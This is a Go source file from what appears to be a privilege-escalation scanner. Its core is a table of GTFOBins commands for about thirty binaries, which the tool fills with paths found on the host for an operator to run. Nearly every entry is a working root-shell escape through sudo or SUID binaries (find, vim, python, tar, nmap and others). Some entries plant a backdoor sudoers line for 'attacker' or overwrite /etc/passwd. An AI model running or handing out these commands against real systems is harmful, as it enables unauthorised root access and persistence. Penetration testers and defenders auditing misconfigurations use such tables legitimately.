package scan

import (
	"path/filepath"
	"strings"
)

// Technique holds the canonical GTFOBins escape templates for one binary.
// {bin} is replaced with the absolute path of the binary found on the host.
// These are the exact, published GTFOBins commands; the operator runs them.
type Technique struct {
	// Sudo is the escape when the binary is runnable via NOPASSWD sudo.
	Sudo string
	// Suid is the escape when the binary itself is SUID-root.
	Suid string
	Ref  string
}

// gtfobins is a curated subset of GTFOBins covering the binaries that most
// commonly appear in sudo/SUID misconfigurations. It is intentionally small and
// easy to extend — add an entry and both the sudo and SUID checks pick it up.
var gtfobins = map[string]Technique{
	"find":      {Sudo: "sudo {bin} . -exec /bin/sh \\; -quit", Suid: "{bin} . -exec /bin/sh -p \\; -quit", Ref: "https://gtfobins.github.io/gtfobins/find/"},
	"vim":       {Sudo: "sudo {bin} -c ':!/bin/sh'", Suid: "{bin} -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'", Ref: "https://gtfobins.github.io/gtfobins/vim/"},
	"vi":        {Sudo: "sudo {bin} -c ':!/bin/sh'", Suid: "{bin} -c ':!/bin/sh -p'", Ref: "https://gtfobins.github.io/gtfobins/vi/"},
	"nano":      {Sudo: "sudo {bin}\n# then ^R^X and run: reset; sh 1>&0 2>&0", Ref: "https://gtfobins.github.io/gtfobins/nano/"},
	"less":      {Sudo: "sudo {bin} /etc/profile\n# then type: !/bin/sh", Suid: "{bin} /etc/profile\n# then type: !/bin/sh -p", Ref: "https://gtfobins.github.io/gtfobins/less/"},
	"more":      {Sudo: "TERM= sudo {bin} /etc/profile\n# then type: !/bin/sh", Ref: "https://gtfobins.github.io/gtfobins/more/"},
	"man":       {Sudo: "sudo {bin} man\n# then type: !/bin/sh", Ref: "https://gtfobins.github.io/gtfobins/man/"},
	"awk":       {Sudo: "sudo {bin} 'BEGIN {system(\"/bin/sh\")}'", Suid: "{bin} 'BEGIN {system(\"/bin/sh\")}'", Ref: "https://gtfobins.github.io/gtfobins/awk/"},
	"gawk":      {Sudo: "sudo {bin} 'BEGIN {system(\"/bin/sh\")}'", Suid: "{bin} 'BEGIN {system(\"/bin/sh\")}'", Ref: "https://gtfobins.github.io/gtfobins/gawk/"},
	"perl":      {Sudo: "sudo {bin} -e 'exec \"/bin/sh\";'", Suid: "{bin} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'", Ref: "https://gtfobins.github.io/gtfobins/perl/"},
	"python":    {Sudo: "sudo {bin} -c 'import os; os.system(\"/bin/sh\")'", Suid: "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", Ref: "https://gtfobins.github.io/gtfobins/python/"},
	"python3":   {Sudo: "sudo {bin} -c 'import os; os.system(\"/bin/sh\")'", Suid: "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", Ref: "https://gtfobins.github.io/gtfobins/python/"},
	"ruby":      {Sudo: "sudo {bin} -e 'exec \"/bin/sh\"'", Suid: "{bin} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'", Ref: "https://gtfobins.github.io/gtfobins/ruby/"},
	"node":      {Sudo: "sudo {bin} -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio:[0,1,2]})'", Suid: "{bin} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio:[0,1,2]})'", Ref: "https://gtfobins.github.io/gtfobins/node/"},
	"env":       {Sudo: "sudo {bin} /bin/sh", Suid: "{bin} /bin/sh -p", Ref: "https://gtfobins.github.io/gtfobins/env/"},
	"bash":      {Sudo: "sudo {bin}", Suid: "{bin} -p", Ref: "https://gtfobins.github.io/gtfobins/bash/"},
	"sh":        {Sudo: "sudo {bin}", Suid: "{bin} -p", Ref: "https://gtfobins.github.io/gtfobins/sh/"},
	"dash":      {Sudo: "sudo {bin}", Suid: "{bin} -p", Ref: "https://gtfobins.github.io/gtfobins/dash/"},
	"tcl":       {Sudo: "sudo {bin}\n# then: exec /bin/sh <@stdin >@stdout 2>@stderr", Ref: "https://gtfobins.github.io/gtfobins/tclsh/"},
	"cp":        {Sudo: "# overwrite a root-owned target, e.g. /etc/passwd or a root-run script:\nsudo {bin} /tmp/mypasswd /etc/passwd", Suid: "# use LD_PRELOAD or copy a crafted file as root via {bin}", Ref: "https://gtfobins.github.io/gtfobins/cp/"},
	"tee":       {Sudo: "echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo {bin} -a /etc/sudoers", Ref: "https://gtfobins.github.io/gtfobins/tee/"},
	"dd":        {Sudo: "# write a root-owned file, e.g. append a sudoers entry via {bin}", Ref: "https://gtfobins.github.io/gtfobins/dd/"},
	"tar":       {Sudo: "sudo {bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", Suid: "{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", Ref: "https://gtfobins.github.io/gtfobins/tar/"},
	"zip":       {Sudo: "TF=$(mktemp -u); sudo {bin} $TF /etc/hosts -T -TT 'sh #'", Ref: "https://gtfobins.github.io/gtfobins/zip/"},
	"gdb":       {Sudo: "sudo {bin} -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\")' -ex quit", Suid: "{bin} -nx -ex 'python import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")' -ex quit", Ref: "https://gtfobins.github.io/gtfobins/gdb/"},
	"nmap":      {Sudo: "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; sudo {bin} --script=/tmp/x.nse", Suid: "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; {bin} --script=/tmp/x.nse", Ref: "https://gtfobins.github.io/gtfobins/nmap/"},
	"ed":        {Sudo: "sudo {bin}\n# then type: !/bin/sh", Suid: "{bin}\n# then type: !/bin/sh", Ref: "https://gtfobins.github.io/gtfobins/ed/"},
	"ftp":       {Sudo: "sudo {bin}\n# then type: !/bin/sh", Ref: "https://gtfobins.github.io/gtfobins/ftp/"},
	"systemctl": {Sudo: "# create a malicious unit and start it as root via {bin}", Ref: "https://gtfobins.github.io/gtfobins/systemctl/"},
	"openssl":   {Sudo: "# load a malicious engine .so as root via {bin}", Ref: "https://gtfobins.github.io/gtfobins/openssl/"},
}

// lookupGTFO returns the technique for a binary path by its base name.
func lookupGTFO(binPath string) (Technique, bool) {
	t, ok := gtfobins[strings.ToLower(filepath.Base(binPath))]
	return t, ok
}

// renderCmd substitutes the binary path into a technique template.
func renderCmd(tmpl, binPath string) string {
	return strings.ReplaceAll(tmpl, "{bin}", binPath)
}
